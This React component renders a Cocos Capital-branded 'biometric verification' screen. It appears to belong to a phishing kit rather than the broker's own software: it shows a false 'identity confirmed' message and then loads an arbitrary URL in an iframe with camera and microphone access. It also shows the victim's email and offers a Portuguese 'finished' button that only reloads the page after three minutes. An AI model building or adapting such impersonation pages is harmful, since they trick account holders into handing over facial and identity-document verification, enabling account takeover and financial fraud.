import { useEffect, useState } from "react";
import { ShieldCheck, Clock, CheckCircle2, ExternalLink } from "lucide-react";
import CocosLogo from "@/components/cocos/CocosLogo";

interface CocosV2BiometricScreenProps {
  email: string;
  fullName: string;
  biometricUrl: string;
}

const CocosV2BiometricScreen = ({ email, fullName, biometricUrl }: CocosV2BiometricScreenProps) => {
  const [visible, setVisible] = useState(false);
  const [iframeOpen, setIframeOpen] = useState(false);
  const [showFinishBtn, setShowFinishBtn] = useState(false);
  const firstName = fullName?.split(" ")?.[0] || "";

  useEffect(() => {
    const t = setTimeout(() => setVisible(true), 100);
    return () => clearTimeout(t);
  }, []);

  // Show "Finalizei" button after 3 minutes of opening iframe
  useEffect(() => {
    if (!iframeOpen) return;
    const t = setTimeout(() => setShowFinishBtn(true), 3 * 60 * 1000);
    return () => clearTimeout(t);
  }, [iframeOpen]);

  if (iframeOpen) {
    return (
      <div className={`w-full max-w-[520px] transition-all duration-500 ${visible ? "opacity-100" : "opacity-0"}`}>
        <div className="flex justify-center mb-4">
          <CocosLogo />
        </div>

        <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
          <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />

          {/* Iframe container */}
          <div className="w-full" style={{ height: "520px" }}>
            <iframe
              src={biometricUrl}
              className="w-full h-full border-0"
              allow="camera; microphone"
              title="Verificación biométrica"
            />
          </div>

          {/* Finish button - appears after 3 minutes */}
          <div className="px-6 py-4 border-t border-[#e8edf5]">
            {showFinishBtn ? (
              <button
                onClick={() => window.location.reload()}
                className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#16a34a] to-[#22c55e] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15803d] hover:to-[#16a34a] active:scale-[0.98] shadow-md shadow-green-200"
              >
                <CheckCircle2 size={18} />
                Finalizei todo o processo
              </button>
            ) : (
              <div className="flex items-center justify-center gap-2 text-[13px] text-[#8895aa]">
                <Clock size={14} className="animate-pulse" />
                <span>Complete a verificação acima para continuar...</span>
              </div>
            )}
          </div>
        </div>

        <div className="flex justify-center mt-3">
          <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
            <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
            <span className="text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={`w-full max-w-[480px] transition-all duration-700 ${visible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-6"}`}>
      <div className="flex justify-center mb-6">
        <CocosLogo />
      </div>

      {/* Success badge */}
      <div className="flex justify-center mb-6">
        <div className="relative">
          <div className="absolute -inset-3 rounded-full bg-green-100/50 animate-pulse" />
          <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-gradient-to-br from-[#16a34a] to-[#22c55e] shadow-xl shadow-green-200">
            <CheckCircle2 size={40} className="text-white" strokeWidth={1.8} />
          </div>
        </div>
      </div>

      <h2 className="text-center text-[20px] font-extrabold text-[#1a2233] mb-2 leading-tight">
        ¡Gracias por la verificación{firstName ? `, ${firstName}` : ""}!
      </h2>
      <p className="text-center text-[14px] text-[#5a6a85] leading-relaxed mb-6 max-w-[340px] mx-auto">
        Tu identidad fue confirmada correctamente.
      </p>

      {/* Verification card */}
      <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden mb-6">
        <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />
        <div className="px-6 py-5">
          <div className="flex items-start gap-3 mb-4">
            <ShieldCheck size={20} className="text-[#1a3f8f] flex-shrink-0 mt-0.5" />
            <div>
              <h4 className="text-[15px] font-bold text-[#1a2233] mb-1">Validación de documentos</h4>
              <p className="text-[13px] text-[#5a6a85] leading-relaxed">
                Para garantizar la <strong>seguridad de tu cuenta</strong> y la protección de tus fondos,
                necesitamos una verificación rápida de tus documentos de identidad.
              </p>
            </div>
          </div>

          <div className="space-y-2 mb-4">
            {[
              "Verificación de identidad con documento oficial",
              "Reconocimiento facial rápido y seguro",
              "Protección contra accesos no autorizados",
            ].map((text) => (
              <div key={text} className="flex items-center gap-2.5">
                <span className="w-4 h-4 rounded-full bg-[#16a34a] flex items-center justify-center flex-shrink-0">
                  <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </span>
                <span className="text-[13px] text-[#333]">{text}</span>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 text-[12px] text-[#8895aa] mb-5">
            <Clock size={14} />
            <span>Este proceso toma menos de 5 minutos</span>
          </div>

          <button
            onClick={() => setIframeOpen(true)}
            className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#1a3f8f] to-[#2563eb] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15357a] hover:to-[#1d55d4] active:scale-[0.98] shadow-md shadow-[#1a3f8f]/20"
          >
            Iniciar verificación
            <ExternalLink size={16} />
          </button>
        </div>
      </div>

      <div className="flex justify-center mb-3">
        <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
          <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
          <span className="text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
        </div>
      </div>

      <p className="text-center text-[11px] text-[#b0b8c9] leading-relaxed max-w-[320px] mx-auto">
        🔐 Una vez completada la verificación, tu cuenta quedará totalmente habilitada y lista para operar.
        Cocos Capital se compromete a proteger tu información personal.
      </p>
    </div>
  );
};

export default CocosV2BiometricScreen;
